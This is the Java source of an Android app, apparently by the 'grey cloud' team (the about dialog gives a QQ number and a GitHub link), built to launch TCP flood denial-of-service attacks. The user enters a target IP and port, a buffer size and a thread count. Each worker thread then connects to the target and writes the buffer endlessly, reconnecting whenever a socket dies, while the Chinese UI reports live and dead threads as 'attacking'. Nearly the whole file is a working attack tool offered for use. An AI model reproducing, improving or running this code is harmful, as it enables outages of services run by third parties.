package com.greyCloud.ddos;

import android.app.*;
import android.os.*;
import android.widget.*;
import android.view.*;
import android.view.View.*;
import java.net.*;
import android.support.v7.app.ActionBarActivity;
import java.io.*;
import java.util.*;
public class MainActivity extends ActionBarActivity
{
	public static byte[] buffer;
	ProgressDialog pd;
	public static String ipS;
	public static int port;
	public static long killN=0;
	boolean lock=false;
	Handler uiHandler = new Handler();
	AlertDialog dialog;
	Thread1[] threadPool=null;
	public static long h=0;
	boolean stop=true;
	public static int buffSize=0;
	public static int tN=0;
	String err="";
	int jd=0;
	ProgressDialog pd1;
	//MyHandler mHandler = new MyHandler();
    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
				Button btn1 = (Button) findViewById(R.id.button1);
				Button btn2 = (Button) findViewById(R.id.button2);
        //监听button事件
				pd=new ProgressDialog(this);
	
		pd1=new ProgressDialog(this);
				
				dialog=new AlertDialog.Builder(this).create();
				btn2.setOnClickListener(new OnClickListener() {
				@Override
				public void onClick(View v) {
					if(!lock){
						dialog.setTitle("警告");
						dialog.setMessage("当前没有在执行攻击");
						dialog.show();
						return;
					}
					pd1.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);// 设置水平进度条  
					pd1.setCancelable(false);// 设置是否可以通过点击Back键取消  
					pd1.setCanceledOnTouchOutside(false);// 设置在点击Dialog外是否取消Dialog进度条  
					//dialog.setIcon(R.drawable.ic_launcher);// 设置提示的title的图标，默认是没有的  
					pd1.setTitle("正在终止...");  
					pd1.setMax(threadPool.length);  
					pd1.setMessage("等待线程退出...");
					pd1.show();  
					stop s=new stop(threadPool.length);
					s.start();
					lock=false;
					stop=false;
				}
				class stop extends Thread{
					int l=0;
					public stop(int l){
						this.l=l;
					}
					@Override
					public void run(){
						for(int i=0;i<l;i++){
							try{
							threadPool[i].s.close();
							}catch(Exception e){}
							threadPool[i].interrupt();
							jd=i;
							Runnable runnable = new Runnable() {
								@Override
								public void run() {
									//pd1.setMessage(String.valueOf(jd));
									pd1.incrementProgressBy(jd);
							}};
									uiHandler.post(runnable);
						}
						Runnable runnable = new Runnable() {
							@Override
							public void run() {
								pd1.cancel();
								killN=0;
								h=0;
								jd=0;
								((LinearLayout)findViewById(R.id.ll)).setVisibility(View.GONE);
							}
						};
						uiHandler.post(runnable);
					}
				}
			});
        btn1.setOnClickListener(new OnClickListener() {
					@Override
					public void onClick(View v) {
						if(lock){
							dialog.setTitle("警告");
							dialog.setMessage("当前攻击正在执行");
							dialog.show();
							return;
						}
						pd.setProgressStyle(ProgressDialog.STYLE_SPINNER);
						pd.setCanceledOnTouchOutside(false);
						pd.setMessage("初始化...");
						pd.show();
						lock=true;
						
						LinearLayout ll;
						EditText ip=null;
						EditText thread;
						EditText buff=null;
						TextView kill;
						try{
							ll=(LinearLayout)findViewById(R.id.ll);
							kill=(TextView)findViewById(R.id.killThread);
							ip=(EditText)findViewById(R.id.ip);
							buff=(EditText)findViewById(R.id.buff);
							thread=(EditText)findViewById(R.id.thread);
							kill.setText("正在攻击，线程死亡速度:0个/s\n存活线程:0");
						}catch(Exception e){
							pd.cancel();
							dialog.setTitle("错误");
							dialog.setMessage("初始化失败："+e.getMessage());
							dialog.show();
							return;
						}
						String[] temp=ip.getText().toString().split(":");
						if(temp.length!=2){
							pd.cancel();
							dialog.setTitle("错误");
							dialog.setMessage("ip格式错误");
							dialog.show();
							return;
						}
						ipS=temp[0];
						try{
							buffSize=Integer.parseInt(buff.getText().toString());
						}catch(Exception e){
							pd.cancel();
							dialog.setTitle("错误");
							dialog.setMessage("缓冲大小错误");
							dialog.show();
							return;
						}
						port=Integer.parseInt(temp[1]);
						tN=Integer.parseInt(thread.getText().toString());
						
						Thread2 t=new Thread2();
						t.start();
					}
					class Thread2 extends Thread{
						@Override
						public void run(){
									try{
										buffer=new byte[1024*buffSize];
										for(int i=0;i<1024*buffSize;i++) {
											buffer[i]=127;
										}
									}catch(Exception e){
										err=e.getMessage();
										Runnable runnable = new Runnable() {
											@Override
											public void run() {
												pd.cancel();
												dialog.setTitle("错误");
												dialog.setMessage("创建缓冲区时发生错误："+err);
												dialog.show();
											}};
										uiHandler.post(runnable);
										
										return;
									}
							Runnable runnable = new Runnable() {
								@Override
								public void run() {
									pd.setMessage("正在释放线程...");
								}};
								uiHandler.post(runnable);
									try{
										threadPool=new Thread1[tN];
										for(int i=0;i<tN;i++) {
											//Runnable thread1 = new Thread1(); 
											Thread1 thread2 = new Thread1();
											threadPool[i]=thread2;
											threadPool[i].start();
										}
									}catch(Exception e){
										err=e.getMessage();
										Runnable runnable2 = new Runnable() {
											@Override
											public void run() {
										pd.cancel();
										dialog.setTitle("错误");
										dialog.setMessage("释放线程时发生错误："+err);
										dialog.show();
										}};
										uiHandler.post(runnable2);
										return;
									}
									th t=new th();
									t.start();
							Runnable runnable1 = new Runnable() {
								@Override
								public void run() {
									pd.cancel();
									((LinearLayout)findViewById(R.id.ll)).setVisibility(View.VISIBLE);
								}};
							uiHandler.post(runnable1);
						}
					}
					class th extends Thread{
						@Override
						public void run(){
							while(stop){
								try{
									Thread.sleep(1000);
								}catch(Exception e){
									
								}
								Runnable runnable = new Runnable() {
									@Override
									public void run() {
										TextView kill=(TextView)findViewById(R.id.killThread);
										kill.setText("正在攻击，线程死亡速度:"+killN+"个/s\n存活线程:"+h);
										killN=0;
									}
								};
								uiHandler.post(runnable);
							}
						}
					}
				});
		
    }
	@Override
	public boolean onCreateOptionsMenu(Menu menu)
	{
		// Inflate main_menu.xml 
		MenuInflater inflater = getMenuInflater();
		inflater.inflate(R.layout.main_menu, menu);
		return true;
	}

	@Override
	public boolean onOptionsItemSelected(MenuItem item)
	{
		switch (item.getItemId())
		{
			case R.id.about:
				AlertDialog dialog=new AlertDialog.Builder(this).create();
				dialog.setMessage("作者:菜问先生\nQQ:2970046657\n出品:灰色云团队\ngithub:https://github.com/greyCloudTeam/FuckDdos");
				dialog.show();
				return true;
			case R.id.updata:
				AlertDialog dialog1=new AlertDialog.Builder(this).create();
				dialog1.setMessage("1.4更新内容:\n修复了所有bug\n直接强制停止所有线程，方便快捷\n代码优化，更省资源\n总死亡线程数量不再统计，直接统计每秒死多少线程\n点击开始攻击时不再卡死");
				dialog1.show();
				return true;
		}
		return super.onOptionsItemSelected(item);
	}
}
class Thread1 extends Thread{
	public Socket s=null;
	@Override
	public void run(){
		
		
		OutputStream os=null;
		DataOutputStream dos=null;
		while(!isInterrupted()){
		try {
			s=new Socket(MainActivity.ipS,MainActivity.port);
			MainActivity.h++;
			//流准备
			//s.setSoTimeout(
			os=s.getOutputStream();
			dos=new DataOutputStream(os);
			while(!isInterrupted()) {
				dos.write(MainActivity.buffer);
				dos.flush();
			}
		}catch(Exception e) {
			MainActivity.killN++;
			MainActivity.h--;
			//MainActivity.kill.setText("正在攻击，当前已死亡线程:"+MainActivity.killN);
			///uiHandler.post(runnable1);
			//System.out.println("线程死亡，重生！"+e.getMessage());
			//Runnable thread1 = new Thread1(); 
			}
		}
	}
}
